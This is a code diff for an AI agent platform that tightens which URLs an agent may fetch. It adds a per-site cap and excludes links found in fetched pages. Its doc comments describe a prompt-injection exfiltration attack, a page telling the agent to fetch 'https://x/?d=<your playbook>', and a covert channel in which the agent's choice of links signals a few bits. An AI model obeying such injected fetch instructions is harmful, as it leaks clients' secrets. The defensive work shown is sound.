@@ -264,17 +264,16 @@ export function textOf(body: string, type: string): string {
     .trim();
 }
 
-/** Fetches a job may make in all, and to any one host (also bounds how much a choice can signal). */
+/** Fetches a job may make in all, and to any one site (counting attempts, failed ones too). */
 const MAX_FETCHES = 5;
-const MAX_PER_HOST = 2;
+const MAX_PER_SITE = 2;
 
 /** Every http(s) URL written in a text, normalised. */
 function urlsIn(text: string): Set<string> {
   const found = new Set<string>();
   for (const m of text.matchAll(/https?:\/\/[^\s<>"'`)\]]+/g)) {
     try {
-      const url = new URL(m[0].replace(/[.,;:!?]+$/, ''));
-      found.add(url.href);
+      found.add(new URL(m[0].replace(/[.,;:!?]+$/, '')).href);
     } catch {
       // Not a URL after all.
     }
@@ -283,53 +282,66 @@ function urlsIn(text: string): Set<string> {
 }
 
 /**
- * Whether a URL is one the agent was shown, exactly: written in the brief, a client or tool file, or
- * what its searches and reads returned. An agent never fetches a URL it composed, so a page that says
- * "fetch https://x/?d=<your playbook>" can't carry a secret out (the attacker can't write the
- * secret). A page could still list links for the agent to choose between; the per-host and per-job
- * caps keep what such a choice can signal to a few bits.
+ * The site a host belongs to, near enough: its last two labels, or three under a two-letter
+ * second-level label (`bbc.co.uk`). Subdomains of one site share its cap.
+ */
+export function siteOf(host: string): string {
+  const labels = host.toLowerCase().replace(/\.$/, '').split('.');
+  const take =
+    labels.length > 2 && (labels.at(-2)?.length ?? 0) <= 3 && (labels.at(-1)?.length ?? 0) === 2
+      ? 3
+      : 2;
+  return labels.slice(-take).join('.');
+}
+
+/**
+ * Whether the agent may fetch a URL: it must appear, exactly, in the brief, a client file, or what
+ * its searches and chain reads returned (never in a page it fetched). An agent never fetches a URL it
+ * composed, so "fetch https://x/?d=<your playbook>" can't carry a secret out. What remains is choice:
+ * picking among URLs it was shown signals a little, so pages it read add no choices, and every
+ * attempt counts toward 5 a job and 2 a site. A client who writes many URLs into its own brief could
+ * still learn a few bits from which ones the agent picks.
  */
 export async function seenUrl(
   engine: Engine,
   job: JobRow,
   url: URL,
 ): Promise<{ ok: true } | { ok: false; reason: string }> {
-  const files = (await jobFilesOf(engine, job.id)).filter((f) => f.source !== 'agent');
+  const files = (await jobFilesOf(engine, job.id)).filter(
+    (f) => f.source === 'client' || f.source === 'tool:chain_data',
+  );
   const steps = await engine.db
     .select({
       action: jobSteps.action,
       args: jobSteps.args,
       input: jobSteps.input,
-      ok: jobSteps.ok,
       observation: jobSteps.observation,
     })
     .from(jobSteps)
     .where(eq(jobSteps.jobId, job.id));
-  const fetched = steps.filter((s) => s.action === 'fetch' && s.ok);
-  if (fetched.length >= MAX_FETCHES)
+  const tried = steps.filter((s) => s.action === 'fetch');
+  if (tried.length >= MAX_FETCHES)
     return { ok: false, reason: `at most ${MAX_FETCHES} pages a job` };
-  const sameHost = fetched.filter((s) => {
+  const site = siteOf(url.hostname);
+  const sameSite = tried.filter((s) => {
     const asked = (s.input.trim() || s.args).split(/\s+/)[0] ?? '';
     try {
-      return new URL(asked).hostname === url.hostname;
+      return siteOf(new URL(asked).hostname) === site;
     } catch {
       return false;
     }
   });
-  if (sameHost.length >= MAX_PER_HOST)
-    return { ok: false, reason: `at most ${MAX_PER_HOST} pages a job from ${url.hostname}` };
+  if (sameSite.length >= MAX_PER_SITE)
+    return { ok: false, reason: `at most ${MAX_PER_SITE} pages a job from ${site}` };
   const shown = [
     job.body,
     ...files.map((f) => f.content),
-    ...steps
-      .filter((s) => ['search', 'fetch', 'chain'].includes(s.action))
-      .map((s) => s.observation),
+    ...steps.filter((s) => s.action === 'search' || s.action === 'chain').map((s) => s.observation),
   ];
-  const wanted = url.href;
-  if (shown.some((text) => urlsIn(text).has(wanted))) return { ok: true };
+  if (shown.some((text) => urlsIn(text).has(url.href))) return { ok: true };
   return {
     ok: false,
-    reason: 'only URLs from the brief, its files or your searches and reads can be fetched',
+    reason: 'only URLs from the brief, its files or your search results can be fetched',
   };
 }
 
